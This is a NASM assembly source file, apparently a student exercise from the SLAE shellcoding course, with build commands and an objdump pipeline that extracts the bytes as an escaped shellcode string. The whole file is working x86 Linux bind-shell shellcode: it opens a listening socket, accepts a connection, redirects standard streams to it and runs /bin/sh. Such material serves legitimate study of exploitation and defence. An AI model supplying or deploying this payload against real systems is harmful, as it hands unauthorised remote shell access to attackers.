; Filename:      shellcode-orig-asm.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  26.12.2018
; Assembler:     nasm -f elf32 shellcode-orig-asm.nasm -o shellcode-orig-asm.o
; Linker:        ld -N -m elf_i386 shellcode-orig-asm.o -o shellcode-orig-asm
; Assembly dump: objdump -d ./shellcode-orig-asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

_start:

  xor    ebx,ebx
  mul    ebx
  mov    al,0x66
  inc    ebx
  push   edx
  push   ebx
  push   0x2
  mov    ecx,esp
  int    0x80                 ;sys_socketcall (SYS_SOCKET)

  push   edx
  push   eax
  mov    ecx,esp
  mov    al,0x66
  mov    bl,0x4
  int    0x80                 ;sys_socketcall (SYS_LISTEN)

  mov    al,0x66
  inc    ebx
  int    0x80                 ;sys_socketcall (SYS_ACCEPT)

  pop    ecx
  xchg   ebx,eax

label:

  push   0x3f
  pop    eax
  int    0x80                 ;sys_dup2

  dec    ecx
  jns    label

  mov    al,0xb
  push   0x68732f2f
  push   0x6e69622f
  mov    ebx,esp
  inc    ecx
  int    0x80                  ;execve shell
